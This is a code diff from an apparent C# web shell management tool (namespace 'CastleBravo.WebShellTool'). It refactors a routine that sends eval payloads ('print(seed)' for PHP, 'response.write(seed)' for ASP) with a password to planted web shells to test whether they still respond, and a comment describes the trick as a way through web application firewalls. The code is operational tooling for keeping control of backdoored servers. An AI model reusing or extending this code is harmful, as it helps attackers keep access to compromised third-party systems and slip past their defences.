@@ -438,16 +438,16 @@ namespace C2.Business.CastleBravo.WebShellTool
                     return "跳";
 
                 // 我总结的print穿透WAF大法
-                if (PostPrintTimeout(NetUtil.FormatUrl(task.Url), task.Password))
+                if (PostPrintTimeout(task))
                     return "√";
                 
             }
             return status;
         }
 
-        private bool PostPrintTimeout(string url, string password, int timeout = 5)
+        private bool PostPrintTimeout(WebShellTaskConfig task, int timeout = 5)
         {   // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
-            var t = Task.Run(() => PostPrint(url, password));
+            var t = Task.Run(() => CheckAlive(task));
             // 代理慢, timeout富裕一些
             timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;
 
@@ -477,12 +477,18 @@ namespace C2.Business.CastleBravo.WebShellTool
             return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
         }
 
-        private bool PostPrint(string url, string password)
+        private bool CheckAlive(WebShellTaskConfig task)
         {
             try
-            {   
+            {
+                string url = NetUtil.FormatUrl(task.Url);
+                string pass = task.Password;
                 string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
-                string result = WebClientEx.Post(url, string.Format("{0}=print({1});", password, seed), 1500, Proxy);
+                string payload = task.TrojanType == "phpEval" ? string.Format("=print({0});", seed) :
+                                 task.TrojanType == "aspEval" ? string.Format("=response.write({0})", seed) :
+                                 string.Empty;
+
+                string result = WebClientEx.Post(url, pass + payload, 1500, Proxy);
                 return result.Contains(seed);
             } catch { return false; }
             
